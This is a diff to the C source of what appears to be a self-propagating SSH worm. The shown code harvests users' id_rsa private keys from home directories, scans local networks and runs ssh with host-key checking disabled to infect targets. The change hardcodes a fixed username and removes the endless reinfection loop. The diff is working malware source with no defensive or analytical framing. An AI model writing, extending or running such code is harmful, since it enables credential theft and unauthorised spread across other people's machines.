@@ -28,9 +28,8 @@
 #define SSH_TIMEOUT 10
 
 char* SSH_KEY_PATH = NULL;
-char* SSH_USER = NULL;
+char* SSH_USER = "bdsm";
 char* SSH_KEY_LIST[100];
-char* SSH_USER_LIST[100];
 int SSH_KEY_COUNT = 0;
 char* local_ips[10];
 int local_ip_count = 0;
@@ -226,15 +225,7 @@ int read_ssh_key() {
             snprintf(key_path, sizeof(key_path), "%s/.ssh/id_rsa", user_path);
             
             if (access(key_path, R_OK) == 0) {
-                SSH_KEY_LIST[SSH_KEY_COUNT] = strdup(key_path);
-                
-                char user[256];
-                if (sscanf(key_path, "/home/%255[^/]/", user) == 1) {
-                    SSH_USER_LIST[SSH_KEY_COUNT] = strdup(user);
-                } else {
-                    SSH_USER_LIST[SSH_KEY_COUNT] = strdup("root");
-                }
-                
+                SSH_KEY_LIST[SSH_KEY_COUNT] = strdup(key_path);                
                 SSH_KEY_COUNT++;
                 if (SSH_KEY_COUNT >= 100) break;
             }
@@ -338,12 +329,11 @@ int infect_target(const char* ip, const char* argv0) {
         snprintf(ssh_cmd, sizeof(ssh_cmd),
             "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
             "-i %s %s@%s 'echo test' 2>/dev/null",
-            SSH_TIMEOUT, SSH_KEY_LIST[i], SSH_USER_LIST[i], ip);
+            SSH_TIMEOUT, SSH_KEY_LIST[i], SSH_USER, ip);
         
         int result = system(ssh_cmd);
         if (result == 0) {
             SSH_KEY_PATH = SSH_KEY_LIST[i];
-            SSH_USER = SSH_USER_LIST[i];
             printf("[+] Using SSH key for user %s on %s\n", SSH_USER, ip);
             found_key = 1;
             break;
@@ -554,7 +544,6 @@ int main(int argc, char* argv[]) {
     }
     
     printf("[+] Found %d local IP(s), scanning %d unique network(s)\n", local_ip_count, unique_network_count);    // Infection loop
-    while (1) {
         printf("\n[*] Starting infection round...\n");
         
         // Scan all unique networks
@@ -572,11 +561,6 @@ int main(int argc, char* argv[]) {
                 infect_target(ip, argv[0]);
             }
         }
-        
-        printf("[*] Round complete. Sleeping 10 seconds...\n");
-        sleep(10);
-    }
-    
     return 0;
 }
 
